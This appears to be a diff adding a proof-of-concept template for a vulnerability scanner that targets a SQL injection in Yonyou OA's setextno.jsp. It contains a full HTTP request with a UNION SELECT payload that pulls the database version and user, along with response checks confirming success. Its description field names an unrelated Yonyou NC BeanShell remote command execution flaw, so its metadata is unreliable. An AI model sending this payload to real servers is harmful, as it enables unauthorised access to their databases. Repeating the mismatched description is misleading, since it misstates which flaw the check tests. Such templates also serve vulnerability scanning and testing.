@@ -1,0 +1,14 @@
+﻿<DudePoc_Name>用友 OA setextno.jsp SQL注入漏洞</DudePoc_Name>
+<DudePoc_Description>用友 NC bsh.servlet.BshServlet 存在远程命令执行漏洞，通过BeanShell 执行远程命令获取服务器权限。</DudePoc_Description>
+<DudePoc_SetHeader>
+GET /yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(17) union all select 1,2,@@version,user()%23 HTTP/1.1
+Host: $<AttackHost>$
+User-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.57
+</DudePoc_SetHeader>
+<DudePoc_SetData>
+
+</DudePoc_SetData>
+<DudePoc_VerifyStatusCode>200</DudePoc_VerifyStatusCode>
+<DudePoc_VerifyData>分机号</DudePoc_VerifyData>
+<DudePoc_VerifyFile></DudePoc_VerifyFile>
+<DudePoc_AttackCode></DudePoc_AttackCode>
